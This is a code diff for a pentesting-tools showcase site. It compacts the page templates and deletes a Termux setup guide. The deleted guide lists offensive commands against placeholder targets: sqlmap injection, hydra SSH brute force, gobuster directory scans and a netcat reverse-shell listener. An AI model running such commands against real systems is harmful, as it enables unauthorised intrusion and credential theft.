-                <div style="margin-top:0.4rem;font-size:0.7rem;color:var(--accent-green);">&#9889; Install: pkg install ${tool.install.replace('pkg install ','')}</div>
-                <div>${tagsHTML}</div>
-            </div>`;
+        toolsHTML += `<div class="tool-card"><h3>${tool.name}</h3><span class="tool-cat">${tool.cat}</span><p>${tool.desc}</p><div class="tool-use">$ ${tool.use.replace(/\n/g,'<br>$ ')}</div><div>${tagsHTML}</div></div>`;
     });
-
-    const pageHTML = `
+    container.insertAdjacentHTML('beforeend', `
         <div class="page" id="page-${catId}">
             <div class="container">
-                <div class="page-header">
-                    <h1>${data.title}</h1>
-                    <p>${data.subtitle}</p>
-                </div>
-                <div class="search-box">
-                    <span class="search-icon">&#128270;</span>
-                    <input type="text" id="search-${catId}" placeholder="Search tools..." oninput="filterTools('${catId}')">
-                </div>
+                <div class="page-header"><h1>${data.title}</h1><p>${data.subtitle}</p></div>
+                <div class="search-box"><span class="search-icon">&#128270;</span><input type="text" id="search-${catId}" placeholder="Search tools..." oninput="filterTools('${catId}')"></div>
                 <div class="tools-grid" id="grid-${catId}">${toolsHTML}</div>
-                <a href="#" class="back-btn" onclick="showPage('home')">&larr; Back to Home</a>
+                <div style="text-align:center;margin:2rem 0;"><a href="#" onclick="showPage('home')" style="color:var(--accent-cyan);text-decoration:none;font-size:1rem;">&larr; Back to Home</a></div>
+                <div class="footer"><p>&copy; 2026 <strong>CyberSec Pro</strong></p></div>
             </div>
-        </div>`;
-    container.insertAdjacentHTML('beforeend', pageHTML);
+        </div>`
+    );
 });
 
 // TIPS PAGE
 let tipsHTML = '';
 tipsData.forEach(tip => {
-    tipsHTML += `
-        <div class="tip-card">
-            <div class="tip-num">${tip.num}</div>
-            <h3>${tip.title}</h3>
-            <p>${tip.desc}</p>
-        </div>`;
+    tipsHTML += `<div class="tip-card"><div class="tip-num">${tip.num}</div><h3>${tip.title}</h3><p>${tip.desc}</p></div>`;
 });
 container.insertAdjacentHTML('beforeend', `
     <div class="page" id="page-tips">
         <div class="container">
-            <div class="page-header">
-                <h1 style="background:linear-gradient(135deg,var(--accent-orange),var(--accent-cyan));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;">30 Expert Pro Tips</h1>
-                <p>Termux & Mobile pentesting ke liye professional advice</p>
-            </div>
-            <div class="search-box">
-                <span class="search-icon">&#128270;</span>
-                <input type="text" id="search-tips" placeholder="Search tips..." oninput="filterTips()">
-            </div>
+            <div class="page-header"><h1 style="background:linear-gradient(135deg,var(--accent-orange),var(--accent-cyan));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;">30 Expert Cybersecurity Tips</h1><p>Professional advice for pentesters and security researchers</p></div>
+            <div class="search-box"><span class="search-icon">&#128270;</span><input type="text" id="search-tips" placeholder="Search tips..." oninput="filterTips()"></div>
             <div class="tips-grid" id="tips-grid">${tipsHTML}</div>
-            <a href="#" class="back-btn" onclick="showPage('home')">&larr; Back to Home</a>
+            <div style="text-align:center;margin:2rem 0;"><a href="#" onclick="showPage('home')" style="color:var(--accent-cyan);text-decoration:none;font-size:1rem;">&larr; Back to Home</a></div>
+            <div class="footer"><p>&copy; 2026 <strong>CyberSec Pro</strong></p></div>
         </div>
-    </div>
-`);
-
-// TERMUX SETUP PAGE
-container.insertAdjacentHTML('beforeend', `
-    <div class="page" id="page-termux">
-        <div class="container">
-            <div class="page-header">
-                <h1>&#128241; Termux Complete Setup Guide</h1>
-                <p>Android phone me Termux install karke cybersecurity tools chalane ka complete method</p>
-            </div>
-            
-            <div style="background:var(--bg-card);border:1px solid var(--border-color);border-radius:12px;padding:1rem;margin:1rem 0;">
-                <h3 style="color:var(--accent-green);margin-bottom:0.5rem;">&#9889; Step 1: Termux Install Karein</h3>
-                <p style="color:var(--text-secondary);font-size:0.85rem;">F-Droid se Termux install karein (Play Store version outdated hai):</p>
-                <div class="tool-use" style="margin-top:0.5rem;">1. F-Droid app store install karein<br>2. F-Droid me 'Termux' search karein<br>3. Install karein (latest version)</div>
-            </div>
-
-            <div style="background:var(--bg-card);border:1px solid var(--border-color);border-radius:12px;padding:1rem;margin:1rem 0;">
-                <h3 style="color:var(--accent-cyan);margin-bottom:0.5rem;">&#9889; Step 2: Basic Setup</h3>
-                <div class="tool-use">termux-setup-storage<br>pkg update && pkg upgrade -y<br>pkg install curl wget git nano python python2</div>
-            </div>
-
-            <div style="background:var(--bg-card);border:1px solid var(--border-color);border-radius:12px;padding:1rem;margin:1rem 0;">
-                <h3 style="color:var(--accent-orange);margin-bottom:0.5rem;">&#9889; Step 3: Important Tools Install</h3>
-                <div class="tool-use">pkg install nmap hydra john sqlmap whatweb wpscan<br>pkg install metasploit (heavy, optional)<br>pip install xsstrike wafw00f dirsearch<br>pkg install netcat-openbsd tcpdump hydra gobuster ffuf</div>
-            </div>
-
-            <div style="background:var(--bg-card);border:1px solid var(--border-color);border-radius:12px;padding:1rem;margin:1rem 0;">
-                <h3 style="color:var(--accent-purple);margin-bottom:0.5rem;">&#9889; Step 4: Storage & Wordlists</h3>
-                <div class="tool-use">pkg install wordlist   # rockyou.txt install karein<br>ls /data/data/com.termux/files/usr/share/wordlists/<br>cp rockyou.txt /sdcard/   # sdcard me copy karein</div>
-            </div>
-
-            <div style="background:var(--bg-card);border:1px solid var(--border-color);border-radius:12px;padding:1rem;margin:1rem 0;">
-                <h3 style="color:var(--accent-pink);margin-bottom:0.5rem;">&#9889; Step 5: Essential Commands Cheatsheet</h3>
-                <div class="tool-use"># Network Scan<br>nmap -sn 192.168.1.0/24<br><br># Directory Busting<br>gobuster dir -u http://target.com -w /sdcord/wordlist.txt<br><br># SQL Injection<br>sqlmap -u 'http://target.com/page?id=1' --dbs<br><br># Brute Force<br>hydra -l admin -P /sdcard/pass.txt ssh://target.com<br><br># Reverse Shell Listener<br>nc -lvnp 4444<br><br># Start Python Server<br>python -m http.server 8080</div>
-            </div>
-
-            <a href="#" class="back-btn" onclick="showPage('home')">&larr; Back to Home</a>
-        </div>
-    </div>
-`);
+    </div>`
+);
 
 function showPage(pageId) {
     document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
@@ -582,7 +527,10 @@ function showPage(pageId) {
     document.getElementById('navLinks').classList.remove('open');
 }
 
-function toggleMenu() { document.getElementById('navLinks').classList.toggle('open'); }
+function toggleMenu() {
+    const navLinks = document.getElementById('navLinks');
+    navLinks.classList.toggle('open');
+}
 
 function filterTools(cat) {
     const s = document.getElementById('search-'+cat).value.toLowerCase();
